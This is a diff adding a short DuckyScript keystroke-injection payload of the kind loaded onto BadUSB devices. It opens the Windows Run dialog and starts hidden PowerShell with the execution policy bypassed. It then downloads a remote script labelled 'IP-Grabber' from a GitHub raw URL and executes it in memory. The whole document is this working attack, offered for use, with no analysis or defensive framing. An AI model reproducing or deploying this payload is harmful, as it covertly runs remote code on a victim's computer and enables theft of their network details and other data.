@@ -1,0 +1,4 @@
+GUI r
+DELAY 1000
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://raw.githubusercontent.com/markyway/speeldoos/main/Assets/IPGrabber/IP-Grabber | iex
+ENTER
